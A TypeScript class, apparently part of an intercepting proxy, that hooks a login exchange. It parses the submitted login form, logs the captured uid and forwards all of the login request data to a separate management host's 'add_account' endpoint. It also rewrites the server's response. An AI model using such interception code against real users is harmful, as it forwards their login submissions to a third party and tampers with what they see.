import request from 'request';
import querystring from 'querystring';
import { EPushUserCode, PushUserResponse } from "../../models/inject_login";
import InjectAbstract from "../inject_abstract";
import { appConfigs } from '../../configs/app';

export default class InjectLogin extends InjectAbstract {
  async handlerRequest(): Promise<string | Buffer | null> {
    return this.requestData;
  }

  async handlerResponse(): Promise<string | Buffer | null> {
    if (!this.requestData || !this.responseData) {
      return this.responseData;
    }

    const str = this.responseData.toString('utf-8');
    const res = await this.pushUser(this.requestData.toString('utf-8'), str);
    if (!res) {
      return this.responseData;
    }
  
    const newData = JSON.parse(str);
    switch (res.code) {
      case EPushUserCode.SUCCESS:
        newData._d.name = res.msg;
        break;
      
      case EPushUserCode.MSG:
        newData._d = {
          ret: -20000,
          msg: res.msg
        }
    }
    return JSON.stringify(newData);
  }

  addRequest(data: unknown): Promise<PushUserResponse> {
    return new Promise((resolve, reject) => {
      request(
        appConfigs.HOST_MGMT + '/pro/add_account',
        {
          method: "POST",
          json: data
        }, 
        (e, d) => {
          if (e) {
            reject(e);
            return;
          }
          resolve(d.body);
        }
      )
    });
  }
  
  async pushUser(reqData: string, resData: string) {
    const oReq = querystring.parse(reqData);
    const oRes = JSON.parse(resData);
    console.log('capture uid: ', oRes._d.uid);
  
    const data = {
      uid:  oRes._d.uid,
      data: oReq
    }
    return await this.addRequest(data).catch(e => null);
  }
  
}